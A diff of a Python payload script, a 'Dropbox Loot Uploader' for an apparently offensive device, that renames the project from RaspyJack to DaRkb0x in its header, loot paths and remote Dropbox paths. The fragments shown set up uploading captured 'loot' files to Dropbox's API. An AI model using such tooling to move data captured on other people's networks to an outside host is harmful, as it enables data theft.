@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-RaspyJack Payload -- Dropbox Loot Uploader
+DaRkb0x Payload -- Dropbox Loot Uploader
 -------------------------------------------
 Author: 7h30th3r0n3
 
@@ -49,8 +49,8 @@ font = scaled_font()
 
 DEBOUNCE = 0.25
 ROW_H = 12
-LOOT_DIR = "/root/Raspyjack/loot"
-CONFIG_PATH = "/root/Raspyjack/loot/Dropbox/config.json"
+LOOT_DIR = "/root/DaRkb0x/loot"
+CONFIG_PATH = "/root/DaRkb0x/loot/Dropbox/config.json"
 UPLOAD_URL = "https://content.dropboxapi.com/2/files/upload"
 SESSION_START_URL = "https://content.dropboxapi.com/2/files/upload_session/start"
 SESSION_APPEND_URL = "https://content.dropboxapi.com/2/files/upload_session/append_v2"
@@ -416,9 +416,9 @@ def _do_upload_files(token, file_paths):
 
         # Build remote path preserving loot structure
         if fpath.startswith(LOOT_DIR):
-            remote = "/RaspyJack" + fpath[len(LOOT_DIR):]
+            remote = "/DaRkb0x" + fpath[len(LOOT_DIR):]
         else:
-            remote = f"/RaspyJack/{filename}"
+            remote = f"/DaRkb0x/{filename}"
 
         _draw_upload_status(filename, 0, file_size, idx, count)
 
